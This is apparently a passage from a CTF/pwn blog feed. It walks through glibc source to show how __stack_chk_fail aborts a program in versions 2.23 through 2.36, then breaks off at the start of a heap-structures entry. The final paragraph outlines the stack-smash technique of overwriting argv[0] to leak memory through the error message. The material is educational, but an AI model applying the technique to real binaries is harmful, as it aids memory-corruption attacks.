    <content type="html"><![CDATA[<p>GCC compiler has a compile parameter which named “<em>stack-protector</em>“, divided into 4 kinds,  “<em>fstack-protector</em>“, “<em>fstack-protector-all</em>“, “<em>fstack-protector-strong</em>“ and “<em>fstack-protector-explicit</em>“. These are used to protect the stack from being attack. When the program crash because of function “<em>__stack_chk_fail</em>“, you will receive “<strong>*** stack smashing detected ***: &lt;NameofProgram&gt; terminated\n</strong>“ and “SIGABRT” signal.</p><p>Today all we know that Canary as a random number can protect our program from stack exploitation, but now you may need to try to learn how “<em>__stack_chk_fail</em>“ make your program crash.</p><p>In this article, I will try to find out how “<em>__stack_chk_fail</em>“ make your program crash in common libc.</p><p>Note: </p><ol><li>We will explore this topic in <strong>GLIBC</strong>, which is the abbreviation of GNU C Library.</li><li>All the seemingly endless loops only want to make gcc “happy”, so that it can prevent gcc from reporing an error because of no retun occurs.</li><li>All subsequent content is compared to glibc-2.23 or the previous version.</li></ol><h2 id="glibc-2-23"><a href="#glibc-2-23" class="headerlink" title="glibc-2.23"></a>glibc-2.23</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// debug/stack_chk_fail_local.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/cdefs.h&gt;</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> __stack_chk_fail (<span class="hljs-type">void</span>) __attribute__ ((<span class="hljs-keyword">noreturn</span>));<br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) attribute_hidden<br>__stack_chk_fail_local (<span class="hljs-type">void</span>) &#123; __stack_chk_fail (); &#125;<span class="hljs-comment">// call __stack_chk_fail</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// debug/stack_chk_fail.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> **__libc_argv attribute_hidden;<br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>))<br>__stack_chk_fail (<span class="hljs-type">void</span>) &#123; __fortify_fail (<span class="hljs-string">&quot;stack smashing detected&quot;</span>); &#125; <span class="hljs-comment">// call __fortify_fail</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// debug/fortify_fail.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> **__libc_argv attribute_hidden;<br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) internal_function<br>__fortify_fail (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)&#123;<br>   <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) <br>    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>, <span class="hljs-comment">/* use 2 for stderr */</span><br>    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<span class="hljs-comment">// call __libc_message</span><br>&#125;<br>libc_hidden_def (__fortify_fail)<span class="hljs-comment">// using libc_hidden_def, is not useful enough in this topc</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// sysdeps/posix/libc_fatal.c</span><br><span class="hljs-type">void</span> __libc_message (<span class="hljs-type">int</span> do_abort, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *fmt, ...) &#123;<br>  va_list ap;<br>  <span class="hljs-type">int</span> fd = <span class="hljs-number">-1</span>;<br>    <br>  va_start (ap, fmt);<br>    <br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> FATAL_PREPARE</span><br>  FATAL_PREPARE;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <br>  <span class="hljs-comment">/* Open a descriptor for /dev/tty unless the user explicitly</span><br><span class="hljs-comment">     requests errors on standard error.  */</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *on_2 = __libc_secure_getenv (<span class="hljs-string">&quot;LIBC_FATAL_STDERR_&quot;</span>);<br>  <span class="hljs-keyword">if</span> (on_2 == <span class="hljs-literal">NULL</span> || *on_2 == <span class="hljs-string">&#x27;\0&#x27;</span>)<br>    fd = open_not_cancel_2 (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);<br><br>  <span class="hljs-keyword">if</span> (fd == <span class="hljs-number">-1</span>)<br>    fd = STDERR_FILENO;<br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">str_list</span> *<span class="hljs-title">list</span> =</span> <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-type">int</span> nlist = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *cp = fmt;<br>  <span class="hljs-keyword">while</span> (*cp != <span class="hljs-string">&#x27;\0&#x27;</span>)<br>    &#123;<br>      <span class="hljs-comment">/* Find the next &quot;%s&quot; or the end of the string.  */</span><br>      <span class="hljs-type">const</span> <span class="hljs-type">char</span> *next = cp;<br>      <span class="hljs-keyword">while</span> (next[<span class="hljs-number">0</span>] != <span class="hljs-string">&#x27;%&#x27;</span> || next[<span class="hljs-number">1</span>] != <span class="hljs-string">&#x27;s&#x27;</span>)<br>&#123;<br>  next = __strchrnul (next + <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;%&#x27;</span>);<br><br>  <span class="hljs-keyword">if</span> (next[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\0&#x27;</span>)<br>    <span class="hljs-keyword">break</span>;<br>&#125;<br>      <span class="hljs-comment">/* Determine what to print.  */</span><br>      <span class="hljs-type">const</span> <span class="hljs-type">char</span> *str;<br>      <span class="hljs-type">size_t</span> len;<br>      <span class="hljs-keyword">if</span> (cp[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;%&#x27;</span> &amp;&amp; cp[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;s&#x27;</span>)<br>&#123;<br>  str = va_arg (ap, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *);<br>  len = <span class="hljs-built_in">strlen</span> (str);<br>  cp += <span class="hljs-number">2</span>;<br>&#125;<br>      <span class="hljs-keyword">else</span><br>&#123;<br>  str = cp;<br>  len = next - cp;<br>  cp = next;<br>&#125;<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">str_list</span> *<span class="hljs-title">newp</span> =</span> alloca (<span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">struct</span> str_list));<br>      newp-&gt;str = str;<br>      newp-&gt;len = len;<br>      newp-&gt;next = <span class="hljs-built_in">list</span>;<br>      <span class="hljs-built_in">list</span> = newp;<br>      ++nlist;<br>    &#125;<br><br>  <span class="hljs-type">bool</span> written = <span class="hljs-literal">false</span>;<br>  <span class="hljs-keyword">if</span> (nlist &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">iovec</span> *<span class="hljs-title">iov</span> =</span> alloca (nlist * <span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">struct</span> iovec));<br>      <span class="hljs-type">ssize_t</span> total = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> cnt = nlist - <span class="hljs-number">1</span>; cnt &gt;= <span class="hljs-number">0</span>; --cnt)<br>&#123;<br>  iov[cnt].iov_base = (<span class="hljs-type">char</span> *) <span class="hljs-built_in">list</span>-&gt;str;<br>  iov[cnt].iov_len = <span class="hljs-built_in">list</span>-&gt;len;<br>  total += <span class="hljs-built_in">list</span>-&gt;len;<br>  <span class="hljs-built_in">list</span> = <span class="hljs-built_in">list</span>-&gt;next;<br>&#125;<br><br>      written = WRITEV_FOR_FATAL (fd, iov, nlist, total);<br><br>      <span class="hljs-keyword">if</span> (do_abort)<br>&#123;<br>  total = ((total + <span class="hljs-number">1</span> + GLRO(dl_pagesize) - <span class="hljs-number">1</span>)<br>   &amp; ~(GLRO(dl_pagesize) - <span class="hljs-number">1</span>));<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">abort_msg_s</span> *<span class="hljs-title">buf</span> =</span> __mmap (<span class="hljs-literal">NULL</span>, total,<br>    PROT_READ | PROT_WRITE,<br>    MAP_ANON | MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> (__glibc_likely (buf != MAP_FAILED))<br>    &#123;<br>      buf-&gt;size = total;<br>      <span class="hljs-type">char</span> *wp = buf-&gt;msg;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> cnt = <span class="hljs-number">0</span>; cnt &lt; nlist; ++cnt)<br>wp = mempcpy (wp, iov[cnt].iov_base, iov[cnt].iov_len);<br>      *wp = <span class="hljs-string">&#x27;\0&#x27;</span>;<br>      <span class="hljs-comment">/* We have to free the old buffer since the application might</span><br><span class="hljs-comment"> catch the SIGABRT signal.  */</span><br>      <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">abort_msg_s</span> *<span class="hljs-title">old</span> =</span> atomic_exchange_acq (&amp;__abort_msg,<br>     buf);<br>      <span class="hljs-keyword">if</span> (old != <span class="hljs-literal">NULL</span>)<br>__munmap (old, old-&gt;size);<br>    &#125;<br>&#125;<br>    &#125;<br><br>  va_end (ap);<br><br>  <span class="hljs-keyword">if</span> (do_abort)<br>    &#123;<br>      BEFORE_ABORT (do_abort, written, fd);<br>      <span class="hljs-comment">/* Kill the application.  */</span><br>      <span class="hljs-built_in">abort</span> ();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Then in “<em>sysdeps&#x2F;posix&#x2F;libc_fatal.c</em>“ we can find function “<em>__libc_message</em>“. If we call this function, the envionment variables which named “<em>LIBC_FATAL_STDERR_</em>“ will be scand with function “<em>__libc_secure_gentenv</em>“, if the value of “<em>LIBC_FATAL_STDERR_</em>“ is ‘\0’ or NULL, stderr will be redirected to “<em>_PATH_TTY</em>‘’, which value is always the path “<em>&#x2F;dev&#x2F;tty</em>“, so the stderr will be printed in terminal. So even thought there is a “while(1)” in “<em>__fortify_fail</em>“ look like an endless loop, it’s not.</p><p>After such these calls, msg and __libc_argv[0] or “&lt;unknown&gt;“ will be printed out in the terminal.</p><h2 id="glibc-2-25"><a href="#glibc-2-25" class="headerlink" title="glibc-2.25"></a>glibc-2.25</h2><p>“<em>&#x2F;debug&#x2F;stack_chk_fail.c</em>“ is same to the file in the same location in glibc-2.23.</p><p>In “<em>&#x2F;debug&#x2F;stack_chk_fail.c</em>“, they finally add<code>strong_alias (__stack_chk_fail, __stack_chk_fail_local)</code> but it is still not useful enough to explian in this topic.</p><p>But function “<em>__libc_message</em>“in “<em>sysdeps&#x2F;posix&#x2F;libc_fatal.c</em>“ has some difference to the file in the same location in glibc-2.23.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// include/stdio.h</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> __<span class="hljs-title">libc_message_action</span></span><br><span class="hljs-class">&#123;</span><br>  do_message= <span class="hljs-number">0</span>,<span class="hljs-comment">/* Print message.  */</span><br>  do_abort= <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">0</span>,<span class="hljs-comment">/* Abort.  */</span><br>  do_backtrace= <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">1</span><span class="hljs-comment">/* Backtrace.  */</span><br>&#125;; <span class="hljs-comment">// do_message=0, do_abort=1, do_backtrace=2</span><br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// sysdeps/posix/libc_fatal.c</span><br><span class="hljs-type">void</span> __libc_message (<span class="hljs-keyword">enum</span> __libc_message_action action, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *fmt, ...) &#123;<br>  <br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  same to glibc-2.23</span><br><span class="hljs-comment">  */</span><br>  <br>  <span class="hljs-comment">/* Don&#x27;t call __libc_secure_getenv if we aren&#x27;t doing backtrace, which</span><br><span class="hljs-comment">     may access the corrupted stack.  */</span><br>  <span class="hljs-keyword">if</span> ((action &amp; do_backtrace)) <span class="hljs-comment">// In comments, we can clarify the creator&#x27;s intention.</span><br>    &#123; <span class="hljs-comment">// It does not matter a lot of time actually</span><br>      <span class="hljs-comment">/* Open a descriptor for /dev/tty unless the user explicitly</span><br><span class="hljs-comment"> requests errors on standard error.  */</span><br>      <span class="hljs-type">const</span> <span class="hljs-type">char</span> *on_2 = __libc_secure_getenv (<span class="hljs-string">&quot;LIBC_FATAL_STDERR_&quot;</span>);<br>      <span class="hljs-keyword">if</span> (on_2 == <span class="hljs-literal">NULL</span> || *on_2 == <span class="hljs-string">&#x27;\0&#x27;</span>)<br>fd = __open_nocancel (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);<br>    &#125;<br>    <br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">  same to glibc-2.23</span><br><span class="hljs-comment">  */</span><br>    <br>  <span class="hljs-keyword">while</span> (*cp != <span class="hljs-string">&#x27;\0&#x27;</span>)<br>    &#123;<br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">      same to glibc-2.23</span><br><span class="hljs-comment">      */</span><br>  <span class="hljs-keyword">if</span> ((action &amp; do_abort))<br>    &#123;<br>      <span class="hljs-keyword">if</span> ((action &amp; do_backtrace))<br>BEFORE_ABORT (do_abort, written, fd);<br>      <span class="hljs-comment">/* Kill the application.  */</span><br>      <span class="hljs-built_in">abort</span> ();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Relatively little difference, but it does become more standardized.</p><h2 id="glibc-2-27"><a href="#glibc-2-27" class="headerlink" title="glibc-2.27"></a>glibc-2.27</h2><p>“<em>&#x2F;debug&#x2F;stack_chk_fail.c</em>“ is same to the file in the same location in glibc-2.23.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// debug/stack_chk_fail.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> **__libc_argv attribute_hidden;<br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>))<br>__stack_chk_fail (<span class="hljs-type">void</span>) &#123; __fortify_fail_abort (<span class="hljs-literal">false</span>, <span class="hljs-string">&quot;stack smashing detected&quot;</span>); &#125;<br>strong_alias (__stack_chk_fail, __stack_chk_fail_local)<br></code></pre></td></tr></table></figure><p>We see that the function who calls the string “stack smashing detected” is changed into “<em>__fortify_fail_abort</em>“ and another parament “false” is added, which is imported from header “<em>stdboo.h</em>“.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// debug/fortify_fail.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-type">char</span> **__libc_argv attribute_hidden;<br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>))<br>__fortify_fail_abort (<span class="hljs-type">_Bool</span> need_backtrace, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg) &#123;<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    __libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort,<br>    <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>, msg,<br>    (need_backtrace &amp;&amp; __libc_argv[<span class="hljs-number">0</span>] != <span class="hljs-literal">NULL</span><br>     ? __libc_argv[<span class="hljs-number">0</span>] : <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>));<br>&#125;<br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) __fortify_fail (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg) &#123;<br>  __fortify_fail_abort (<span class="hljs-literal">true</span>, msg);<br>&#125;<br>libc_hidden_def (__fortify_fail)<br>libc_hidden_def (__fortify_fail_abort)<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// include/stdio.h</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> __<span class="hljs-title">libc_message_action</span></span><br><span class="hljs-class">&#123;</span><br>  do_message= <span class="hljs-number">0</span>,<span class="hljs-comment">/* Print message.  */</span><br>  do_abort= <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">0</span>,<span class="hljs-comment">/* Abort.  */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>In this glibc version, publisher add a boolean number whose name is need_backtrace, so that we can use this to avoid doing backtrace since “<em>__libc_argv[0]</em>“ may point to the corrupted stack.</p><p>“<em>__libc_message</em>“ is same to glibc-2.25.</p><p>So glibc-2.27 is more secure about whether backtrace is needed in function”<em>__libc_message</em>“.</p><h2 id="glibc-2-31-x2F-glibc-2-35-x2F-glibc-2-36"><a href="#glibc-2-31-x2F-glibc-2-35-x2F-glibc-2-36" class="headerlink" title="glibc-2.31&#x2F;glibc-2.35&#x2F;glibc-2.36"></a>glibc-2.31&#x2F;glibc-2.35&#x2F;glibc-2.36</h2><p>“<em>&#x2F;debug&#x2F;stack_chk_fail.c</em>“ is same to the file in the same location in glibc-2.23.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// debug/stack_chk_fail.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) __stack_chk_fail (<span class="hljs-type">void</span>)<br>&#123; __fortify_fail (<span class="hljs-string">&quot;stack smashing detected&quot;</span>); &#125;<br>strong_alias (__stack_chk_fail, __stack_chk_fail_local)<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// debug/fortify_fail.c</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) __fortify_fail (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)<br>&#123; <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) __libc_message (do_abort, <span class="hljs-string">&quot;*** %s ***: terminated\n&quot;</span>, msg); &#125;<br>libc_hidden_def (__fortify_fail)<br></code></pre></td></tr></table></figure><p>Something wrong? Why is there less code this time? It was as if times had gone backwards!</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// sysdeps/posix/libc_fatal.c</span><br><span class="hljs-type">void</span> __libc_message (<span class="hljs-keyword">enum</span> __libc_message_action action, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *fmt, ...)<br>&#123;<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">    same to glibc-2.23</span><br><span class="hljs-comment">  */</span><br>  <span class="hljs-keyword">if</span> (nlist &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">        same to glibc-2.23</span><br><span class="hljs-comment">      */</span><br>&#125;<br>    <span class="hljs-comment">/* remove written = */</span><br>      WRITEV_FOR_FATAL (fd, iov, nlist, total);<br><br>      <span class="hljs-keyword">if</span> ((action &amp; do_abort))<br>&#123;<br>  <span class="hljs-comment">/*</span><br><span class="hljs-comment">      same to glibc-2.25</span><br><span class="hljs-comment">      */</span><br>  <span class="hljs-keyword">if</span> ((action &amp; do_abort))<br>    <span class="hljs-comment">/* Kill the application.  */</span><br>    <span class="hljs-built_in">abort</span> ();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>In glibc-2.31 the publisher removed the following relative to glibc-2.27:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Open a descriptor for /dev/tty unless the user explicitly</span><br><span class="hljs-comment">     requests errors on standard error.  */</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *on_2 = __libc_secure_getenv (<span class="hljs-string">&quot;LIBC_FATAL_STDERR_&quot;</span>);<br>  <span class="hljs-keyword">if</span> (on_2 == <span class="hljs-literal">NULL</span> || *on_2 == <span class="hljs-string">&#x27;\0&#x27;</span>)<br>    fd = open_not_cancel_2 (_PATH_TTY, O_RDWR | O_NOCTTY | O_NDELAY);<br></code></pre></td></tr></table></figure><p>Because they remove<code>BEFORE_ABORT (do_abort, written, fd);</code>, these operations are no longer effective and fd is not fully effective.</p><p>So you can probably tell that some of the code in glibc-2.31 has been optimized to improve readability and usability without changing security. But it doesn’t change the attacker’s operations much.</p><h2 id="Finally"><a href="#Finally" class="headerlink" title="Finally"></a>Finally</h2><p>After all is said and done, as an ELF file is running, it’s filename will be saved into the loader, and before the first rbp register. So if we can get the length from the current input position to the address of argv[0], we can use stack smash attach to get the modified value of “argv[0]”.</p>]]></content>
    
    
    <categories>
      
      <category>Computer</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
      <tag>pwn</tag>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>堆相关数据结构小整理</title>
    <link href="/2023/03/21/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%B0%8F%E6%95%B4%E7%90%86/"/>
    <url>/2023/03/21/%E5%A0%86%E7%9B%B8%E5%85%B3%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%B0%8F%E6%95%B4%E7%90%86/</url>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span 